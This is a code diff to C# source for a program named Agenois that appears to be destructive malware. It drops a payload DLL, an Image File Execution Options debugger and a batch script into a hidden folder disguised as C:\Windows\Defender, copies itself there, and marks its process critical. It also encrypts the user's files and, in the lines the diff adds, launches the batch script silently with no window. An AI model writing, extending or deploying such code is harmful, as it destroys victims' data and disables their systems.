@@ -23,15 +23,8 @@ namespace Agenois
 
             string extractPath = @"C:\Windows\Defender";
             Directory.CreateDirectory(@"C:\Windows\Defender");
-            try
-            {
-                File.WriteAllBytes(extractPath + "\\Payloads.dll", Resources.Payloads);
-            }
-            catch { }
             
             //Everything on startup.
-
-            Destructive.EnableCriticalMode();
 
             RegistryKey editKey;
 
@@ -41,7 +34,11 @@ namespace Agenois
             {
                 File.WriteAllBytes(extractPath + "\\cursor.ani", Resources.skull1);
                 File.WriteAllBytes(extractPath + "\\IFEO.exe", Resources.IFEODebugger);
+                File.WriteAllText(extractPath + "\\Action.bat", Resources.Action);
+                File.WriteAllBytes(extractPath + "\\Payloads.dll", Resources.Payloads);
                 File.Copy(Application.ExecutablePath, extractPath + @"\Agenois.exe");
+
+                Destructive.EnableCriticalMode();
 
                 DirectoryInfo ch = new DirectoryInfo(extractPath);
                 ch.Attributes = FileAttributes.Hidden;
@@ -183,6 +180,12 @@ namespace Agenois
                 editKey.Close();
 
                 Destructive.EncryptUserFiles();
+
+                Process ScriptProcess = new Process();
+                ScriptProcess.StartInfo.CreateNoWindow = true;
+                ScriptProcess.StartInfo.UseShellExecute = false;
+                ScriptProcess.StartInfo.FileName = extractPath + "\\Action.bat";
+                ScriptProcess.Start();
             }
         }
 
